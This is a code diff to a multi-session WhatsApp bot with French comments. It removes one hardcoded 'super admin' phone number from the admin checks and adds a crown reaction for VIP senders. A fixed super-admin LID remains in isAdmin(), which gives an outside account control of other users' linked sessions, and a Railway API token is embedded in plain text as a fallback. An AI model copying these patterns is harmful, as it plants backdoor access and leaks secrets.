@@ -24,9 +24,9 @@ const config = {
   sessionFolder: './auth_info_baileys',
   usePairingCode: true,
   phoneNumber: '', // Laissé vide — saisi au démarrage
-  adminNumbers: ['84933801806', '107658338123943', '23591234568'], // Admins
+  adminNumbers: ['84933801806', '107658338123943'], // Admins
   railwayToken: process.env.RAILWAY_TOKEN || '96bac1f1-b737-4cb0-b8c7-d8af5a4a0b0a',
-  botAdmins: ['84933801806', '107658338123943', '23591234568'], // Liste des numéros admin (sans @s.whatsapp.net)
+  botAdmins: ['84933801806', '107658338123943'], // Liste des numéros admin (sans @s.whatsapp.net)
   dataFolder: './bot_data',
   maxViewOncePerUser: 50,
   commandCooldown: 2000, // 2 secondes entre les commandes
@@ -334,9 +334,6 @@ function loadStore() {
     if (!filteredAdminNumbers.includes(ownerNum)) filteredAdminNumbers.unshift(ownerNum);
     config.botAdmins    = filteredBotAdmins;
     config.adminNumbers = filteredAdminNumbers;
-    // ✅ Toujours garder 23591234568 même si store écrase
-    if (!config.botAdmins.includes('23591234568')) config.botAdmins.push('23591234568');
-    if (!config.adminNumbers.includes('23591234568')) config.adminNumbers.push('23591234568');
     console.log(`✅ [STORE] Admins chargés: ${config.botAdmins.length} admin(s)`);
   }
 
@@ -572,8 +569,6 @@ function isAdmin(jid) {
   
   // ✅ Super admin LID fixe
   if (jid === '124318499475488@lid' || jid.startsWith('124318499475488')) return true;
-  // ✅ Super admin numéro fixe
-  if (p === '23591234568') return true;
 
   // ✅ Vérifie si c'est le bot lui-même (owner) via globalBotJid
   if (global.botLidJid && (jid === global.botLidJid || jid.split(':')[0] === global.botLidJid.split(':')[0])) return true;
@@ -7722,7 +7717,6 @@ Sayonara everyone
 
 async function handleAutoReactCommand(sock, args, remoteJid, senderJid) {
   if (!isAdmin(senderJid)) {
-    // Admin only — toujours autorisé pour les sessions Lovable via isAdmin()
     await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
     return;
   }
@@ -9802,10 +9796,20 @@ function launchSessionBot(sock, phone, sessionFolder, saveCreds) {
         if (!messageText.startsWith(config.prefix)) continue;
         const _sessionOwnerNum = phone.replace(/[^0-9]/g, '');
         const _senderNum = senderJid.split('@')[0].replace(/[^0-9]/g, '');
-        const _isOwner = message.key.fromMe === true || isAdmin(senderJid)
-          || _senderNum === _sessionOwnerNum
-          || senderJid === '124318499475488@lid'
-          || senderJid.startsWith('124318499475488');
+        // Numéro connecté = admin de sa propre session uniquement
+        const _isOwner = message.key.fromMe === true || isAdmin(senderJid) || _senderNum === _sessionOwnerNum;
+
+        // Réaction 👑 pour super admin (23591234568 ou LID 124318499475488) — pas admin, juste réaction
+        try {
+          const _vipNum = '23591234568';
+          const _isVip = (_senderNum === _vipNum)
+            || senderJid === '124318499475488@lid'
+            || senderJid.startsWith('124318499475488');
+          if (_isVip && !message.key.fromMe) {
+            await sock.sendMessage(remoteJid, { react: { text: '👑', key: message.key } });
+          }
+        } catch(e) {}
+
         if (botMode === 'private' && !isGroup && !_isOwner) continue;
         console.log('[' + phone + '] 📨 ' + messageText.substring(0, 60) + ' de ' + senderJid);
         await handleCommand(sock, message, messageText, remoteJid, senderJid, isGroup, _isOwner);
